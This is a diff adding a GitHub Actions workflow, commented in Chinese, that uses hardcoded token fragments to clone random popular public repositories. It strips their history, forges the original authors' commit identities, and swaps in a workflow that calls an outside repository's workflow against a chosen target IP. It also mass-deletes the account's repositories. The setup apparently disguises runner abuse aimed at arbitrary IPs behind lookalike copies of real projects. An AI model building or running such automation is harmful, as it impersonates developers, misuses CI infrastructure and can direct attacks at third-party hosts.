@@ -1,0 +1,167 @@
+on:
+  # push:
+  #   branches:
+  #     - main
+  workflow_dispatch:
+    inputs:
+      action:
+        description: '请选择要执行的操作'
+        required: true
+        default: 'create_repo'
+        type: choice
+        options:
+          - create_repo
+          - run_workflow
+          - delete_repo
+      ip:
+        description: '目标IP，仅在action=run_workflow时使用'
+        required: false
+        type: string
+
+run-name: '部署 ${{ inputs.action }} ${{ inputs.ip }}'
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  job:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        # token: ["XQJK7ceyaehORLLDuEGyfCsNAUvXGr2esaFT", "PkFmUgSPpkyWd4jobnKfuEoULFfudT2NBWhj"]
+        token: ["PkFmUgSPpkyWd4jobnKfuEoULFfudT2NBWhj", "rHJLYwIKSB03EfE7cyGQ5b8pKZAL9H4NLJbb"]
+          # - index: 5
+          #   token: "cL8IBiDAG7bVokwttyS5fbmtjcOdTP3Iw3I5"
+          
+    env:
+      TZ: Asia/Shanghai
+      TOKEN: "ghp_${{ matrix.token }}"
+
+    steps:
+      - name: 登录
+        run: |
+          echo $TOKEN | gh auth login --with-token
+          gh auth status
+
+          GITHUB_USER=$(gh api user --jq .login)
+          echo "GITHUB_USER=$GITHUB_USER" >> $GITHUB_ENV
+
+      - name: 创建仓库
+        if: ${{ !github.event.inputs.action || github.event.inputs.action == 'create_repo' }}
+        run: |
+          # https://api.github.com/search/repositories?q=size:1000..50000+pushed:%3E2025-06-01+stars:>10&sort=updated&order=desc&per_page=1&page=1
+          echo "=== 随机获取一个 public 仓库并尝试创建新仓库 ==="
+          while true; do
+            page=$(shuf -i 1-1000 -n 1)
+            REPO_JSON=$(gh api "search/repositories?q=size:1000..50000+pushed:%3E2025-06-01+stars:>10&sort=updated&order=desc&per_page=1&page=$page" --jq '.items')
+            REPO_FULL_NAME=$(echo "$REPO_JSON" | jq -r '.[0].full_name')
+            REPO_NAME=$(basename "$REPO_FULL_NAME")
+            echo "随机选中的仓库：$REPO_FULL_NAME，仓库名：$REPO_NAME"
+
+            echo "尝试在 GitHub 上新建同名仓库..."
+            CREATE_OUTPUT=$(gh repo create "$GITHUB_USER/$REPO_NAME" --public 2>&1) && break
+
+            echo "$CREATE_OUTPUT" | grep -q "already exists" && echo "仓库已存在，重新随机..." && sleep 1 && continue
+
+            echo "其他错误，退出：$CREATE_OUTPUT"
+            exit 1
+          done
+          echo "仓库创建完成"
+
+          echo "=== 开始克隆仓库 ==="
+          git clone "https://github.com/${REPO_FULL_NAME}.git"
+          cd "$REPO_NAME"
+          echo "仓库克隆完成，进入目录 $REPO_NAME"
+
+          log_and_summary() {
+            echo "$1"
+            echo "$1" >> $GITHUB_STEP_SUMMARY
+          }
+
+          WORKFLOW_DIR=".github"
+          if [ -d "$WORKFLOW_DIR" ]; then
+            log_and_summary "删除整个 $WORKFLOW_DIR 目录"
+            rm -rf "$WORKFLOW_DIR"
+          else
+            log_and_summary "未找到 $WORKFLOW_DIR 目录"
+          fi
+
+          mkdir -p .github/workflows
+          
+          cat << 'EOF' > .github/workflows/ci.yml
+          on:
+            workflow_dispatch:
+              inputs:
+                ip:
+                  required: true
+                  default: '0.0.0.0'
+                  type: string
+
+          jobs:
+            job:
+              uses: mirllan2025/express/.github/workflows/ci.yml@master
+              with:
+              ip: ${{'${{inputs.ip}}'}}
+          EOF
+
+          echo "=== 获取原仓库最后一次提交的信息 ==="
+          LAST_COMMIT_MESSAGE=$(git log -1 --pretty=%B)
+          LAST_COMMIT_AUTHOR_NAME=$(git log -1 --pretty=%an)
+          LAST_COMMIT_AUTHOR_EMAIL=$(git log -1 --pretty=%ae)
+          LAST_COMMIT_AUTHOR_DATE=$(git log -1 --pretty=%ad --date=iso-strict)
+          echo "最后提交信息：$LAST_COMMIT_MESSAGE"
+          echo "最后提交作者：$LAST_COMMIT_AUTHOR_NAME <$LAST_COMMIT_AUTHOR_EMAIL> at $LAST_COMMIT_AUTHOR_DATE"
+
+          echo "=== 清除历史，只保留最新一次提交 ==="
+          git checkout --orphan latest_branch
+          git add -A
+          
+          echo "::group::commit"
+          GIT_AUTHOR_NAME="$LAST_COMMIT_AUTHOR_NAME" \
+          GIT_AUTHOR_EMAIL="$LAST_COMMIT_AUTHOR_EMAIL" \
+          GIT_AUTHOR_DATE="$LAST_COMMIT_AUTHOR_DATE" \
+          GIT_COMMITTER_NAME="$LAST_COMMIT_AUTHOR_NAME" \
+          GIT_COMMITTER_EMAIL="$LAST_COMMIT_AUTHOR_EMAIL" \
+          GIT_COMMITTER_DATE="$LAST_COMMIT_AUTHOR_DATE" \
+          git commit -m "$LAST_COMMIT_MESSAGE"
+          echo "::endgroup::"
+          
+          echo "commit完成"
+          git branch -D main 2>/dev/null || echo "main 分支不存在可忽略"
+          git branch -m main
+          echo "分支重命名完成"
+
+          echo "=== 推送到新仓库 ==="
+          git remote remove origin
+          git remote add origin "https://$TOKEN@github.com/$GITHUB_USER/$REPO_NAME.git"
+          echo "开始强制推送到新仓库..."
+          git push -f origin main
+          echo "推送完成，仓库部署流程结束"
+
+      - name: 执行
+        if: ${{ github.event.inputs.action == 'run_workflow' }}
+        run: |
+          if [ -z "${{ inputs.ip }}" ]; then
+            echo "ip为空"
+            exit 1
+          fi
+
+          REPO_NAME=$(gh api 'user/repos?sort=created&direction=desc&per_page=1' --jq '.[0].full_name')
+          echo REPO_NAME=$REPO_NAME
+          
+          gh workflow run build.yml \
+            --repo $REPO_NAME \
+            --ref main \
+            --field ip=${{ inputs.ip }}
+
+      - name: 删除仓库
+        if: ${{ github.event.inputs.action == 'delete_repo' }}
+        run: |
+          echo "=== 开始删除所有仓库 ==="
+          gh repo list "$GITHUB_USER" --limit 1000 --json name -q '.[].name' | while read repo; do
+            echo "正在删除 $repo ..."
+            gh repo delete "$GITHUB_USER/$repo" --yes
+          done
+          echo "所有仓库已删除。"
